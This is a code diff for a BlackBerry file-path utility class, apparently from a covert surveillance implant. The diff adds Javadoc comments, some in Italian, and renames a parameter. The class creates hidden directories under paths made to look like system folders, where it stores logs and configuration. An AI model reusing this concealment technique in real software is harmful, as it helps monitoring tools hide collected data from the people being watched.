@@ -19,19 +19,38 @@ import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
+/**
+ * The Class Path.
+ */
 public class Path {
     private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
 
+    /** The Constant SD_PATH. */
     public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
+
+    /** The Constant USER_PATH. */
     public static final String USER_PATH = "file:///store/home/user/$RIM313/";
 
+    /** The Constant LOG_DIR_BASE. */
     public static final String LOG_DIR_BASE = "1";
+
+    /** The Constant MARKUP_DIR. */
     public static final String MARKUP_DIR = "2/";
+
+    /** The Constant CONF_DIR. */
     public static final String CONF_DIR = "2/";
 
     private Path() {
     };
 
+    /**
+     * Crea la directory specificata e la rende hidden. Non crea ricosivamente
+     * le directory.
+     * 
+     * @param dirName
+     *            nome della directory, deve finire con /
+     * @return true, if successful
+     */
     public static synchronized boolean createDirectory(String dirName) {
         FileConnection fconn = null;
 
@@ -42,9 +61,9 @@ public class Path {
                     Connector.READ_WRITE);
 
             if (fconn.exists()) {
-                if (debug != null) {
-                    debug.trace("Directory exists");
-                }
+                /*
+                 * if (debug != null) { debug.trace("Directory exists"); }
+                 */
 
                 return false;
             }
@@ -75,6 +94,11 @@ public class Path {
         return true;
     }
 
+    /**
+     * Gets the roots.
+     * 
+     * @return the roots
+     */
     public static Vector getRoots() {
         Enumeration roots = FileSystemRegistry.listRoots();
         Vector vector = new Vector();
@@ -97,6 +121,9 @@ public class Path {
         return vector;
     }
 
+    /**
+     * Prints the roots.
+     */
     public static void printRoots() {
         Enumeration roots = FileSystemRegistry.listRoots();
 
@@ -114,6 +141,11 @@ public class Path {
         }
     }
 
+    /**
+     * Checks if the SD is present.
+     * 
+     * @return true, if is SD present
+     */
     public static boolean isSDPresent() {
         Enumeration roots = FileSystemRegistry.listRoots();
 
@@ -135,8 +167,14 @@ public class Path {
         return false;
     }
 
-    public static void makeDirs(boolean storeToMMC) {
-        if (storeToMMC) {
+    /**
+     * Crea le directory iniziali.
+     * 
+     * @param storeToSD
+     *            true: crea su SD. false: crea su flash
+     */
+    public static void makeDirs(boolean storeToSD) {
+        if (storeToSD) {
             createDirectory(Path.SD_PATH);
             // createDirectory(Path.SD_PATH + Path.LOG_DIR);
             createDirectory(Path.SD_PATH + Path.MARKUP_DIR);
@@ -151,6 +189,13 @@ public class Path {
         }
     }
 
+    /**
+     * Rimuove la directory specificata, solo se vuota.
+     * 
+     * @param dirName
+     *            the dir name
+     * @return true, if successful
+     */
     public static boolean removeDirectory(String dirName) {
         FileConnection fconn = null;
         try {
